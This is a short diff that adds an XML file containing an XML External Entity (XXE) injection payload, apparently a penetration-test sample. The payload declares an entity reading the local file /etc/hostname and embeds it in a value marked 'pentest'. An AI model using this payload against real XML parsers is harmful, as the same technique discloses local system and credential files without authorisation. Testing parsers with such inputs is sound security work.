@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE value [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
+<value>pentest &xxe;</value>
